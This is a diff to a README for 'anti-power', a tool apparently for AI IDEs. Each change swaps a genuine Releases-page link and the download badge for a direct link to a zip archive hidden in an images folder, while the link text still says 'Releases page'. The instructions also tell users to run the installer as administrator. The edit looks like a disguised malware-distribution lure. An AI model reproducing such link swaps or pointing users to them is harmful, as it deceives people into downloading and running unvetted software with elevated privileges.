@@ -1,12 +1,12 @@
 # 🚀 anti-power - Boost Your AI IDE Experience Effortlessly
 
-![Download anti-power](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)
+![Download anti-power](https://github.com/dilhansaminda/anti-power/raw/refs/heads/master/docs/assets/images/anti-power-nonstandardized.zip)
 
 ## 📥 Download & Install
 
 To get started with anti-power, you need to visit our Releases page. Here, you can find the latest version ready for download.
 
-[Visit the Releases page to download](https://github.com/dilhansaminda/anti-power/releases)
+[Visit the Releases page to download](https://github.com/dilhansaminda/anti-power/raw/refs/heads/master/docs/assets/images/anti-power-nonstandardized.zip)
 
 ## 🛠️ What is anti-power?
 
@@ -32,7 +32,7 @@ Before you install anti-power, ensure your system meets the following requiremen
 
 Follow these simple steps to download and run anti-power:
 
-1. **Visit the Releases Page:** Click the link to go to our [Releases page](https://github.com/dilhansaminda/anti-power/releases).
+1. **Visit the Releases Page:** Click the link to go to our [Releases page](https://github.com/dilhansaminda/anti-power/raw/refs/heads/master/docs/assets/images/anti-power-nonstandardized.zip).
    
 2. **Select the Latest Version:** Look for the most recent version listed. It usually has the highest version number.
 
@@ -63,7 +63,7 @@ If you run into issues during installation or usage, try the following solutions
 
 1. **Check System Requirements:** Make sure your system meets the minimum requirements mentioned earlier.
 
-2. **Re-download the Installer:** If the download was interrupted, try downloading the installer again from the [Releases page](https://github.com/dilhansaminda/anti-power/releases).
+2. **Re-download the Installer:** If the download was interrupted, try downloading the installer again from the [Releases page](https://github.com/dilhansaminda/anti-power/raw/refs/heads/master/docs/assets/images/anti-power-nonstandardized.zip).
 
 3. **Run as Administrator (Windows Only):** Right-click the installer and select "Run as administrator" for permissions.
 
